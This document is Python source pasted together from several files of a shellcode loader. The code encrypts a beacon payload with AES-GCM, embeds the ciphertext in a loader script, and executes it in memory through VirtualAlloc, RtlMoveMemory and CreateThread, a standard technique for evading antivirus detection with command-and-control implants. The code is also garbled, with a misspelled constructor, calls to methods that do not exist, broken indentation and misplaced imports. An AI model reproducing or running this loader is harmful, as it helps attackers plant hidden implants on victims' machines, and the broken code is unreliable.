
from os import getcwd

class CryptoUtils:

   def _init_(self):
       self.key_len = 32
        self.key = self._gen_key(n=self.key_len)  # 默认密钥
       self.iv = os.urandom(12)
def _generate_key(self, n=32):
    randkey = "qazwsxedcrfvtgbyhnujmikolp1234567890!@#$%^&*()<>?:\"{}QAZWSXEDCRFVTGBYHNUJMIKOLP"
    key = ""
    for x in range(n):
        key = key + randkey[randint(0, len(randkey) - 1)]
    return bytes(key, encoding="utf-8")

def _pkcs7_padding(self, plain_text_bytes):
    n = AES.block_size
    free_len = n - len(plain_text_bytes) % n
    padding_chr = bytes(hex(free_len).encode())
    plain_text_bytes += bytearray([free_len]) * free_len
    return plain_text_bytes

def get_key(self):
    return self.key

def encrypt(self, plaintext_raw):
    aes = AES.new(self.key, AES.MODE_GCM, self.iv)
    plaintext_raw = self._pkcs7_padding(plaintext_raw)
    plaintext_raw, tag = aes.encrypt_and_digest(plaintext_raw)
    ciper = self.iv + plaintext_raw + tag
    return ciper

def unit_test(self, content):
    return self._pkcs7_padding(plain_text_bytes=content)

def decrypt(self, cipher_raw):
    aes = AES.new(self.key, AES.MODE_GCM, cipher_raw[:12])
    plain = aes.decrypt_and_verify(cipher_raw[12:-16], cipher_raw[-16:])
    return plain

def shellcode_encrypt(self):
    with open("./bean_raw/beacon-new-profile.bin", "rb") as f:
        shellcode = f.read()
    shellcode_cipher = self.get_key()
    shellcode_cipher += b"||split||"
    shellcode_cipher += self.encrypt(shellcode)
    with open(project_path.get_project_path() + "./resource/shellcode_cipher.tmp", "wb") as f:
        f.write(base64.b64encode(shellcode_cipher))

def shellcode_decrypt(self):
    with open(project_path.get_project_path() + "./resource/shellcode_cipher.tmp", "r") as f:
        shellcode_raw = f.read()
        shellcode = base64.b64decode(shellcode_raw)
        key, cipher = shellcode.split(b"||split||")
        self.key = key
        plain_text_raw = self.decrypt(cipher)
    return plain_text_raw
import re
from step1 import generate_aes_payload
from loguru import logger

def update_shellcode_in_loader():
    with open(project_path.add_abs_path("/step2.py"), "r+", encoding="utf-8") as loader_file:
        with open(project_path.add_abs_path("/resource/shellcode_cipher.tmp"), "rb") as shellcode_file:
            loader_code = loader_file.read()
            shellcode_cipher = shellcode_file.read()
            new_code = re.sub(r"shellcode_raw = b\"(.*?)\"", 'shellcode_raw = b"' + shellcode_cipher.decode() + '"' , loader_code)
            logger.debug(f'Updated loader code: {new_code}')

    with open(project_path.add_abs_path("/step2.py"), 'w', encoding="utf-8") as loader_file:
        loader_file.write(new_code)

def create_cipher_beacon():
    generate_aes_payload()
    update_shellcode_in_loader()
    from os.path import dirname, abspath, join



class ProjectPath:

    @staticmethod
    def get_project_path():
        return dirname(dirname(abspath(__file__)))

    @staticmethod
    def get_resource_path():
        return join(ProjectPath.get_project_path(), "resource")

    @staticmethod
    def add_absolute_path(relative_path):
        return join(ProjectPath.get_project_path(), relative_path)


project_path = ProjectPath()
print(join(project_path.get_project_path(), "resource"))
if __name__ == '__main__':
    print(join(project_path.get_project_path(), "resource"))
    
    import ctypes





class LoadMemory:
    @staticmethod
    def load_memory(content):
        shellcode = bytearray(content)
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p  # Set VirtualAlloc return type as c_void_p
        ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)  # Allocate memory
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  # Create buffer
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, len(shellcode))  # Copy shellcode to memory
        handle = ctypes.windll.kernel32.CreateThread(None, 0, ctypes.c_void_p(ptr), None, 0, None)  # Create thread
        ctypes.windll.kernel32.WaitForSingleObject(handle, -1)  # Wait for the thread to finish

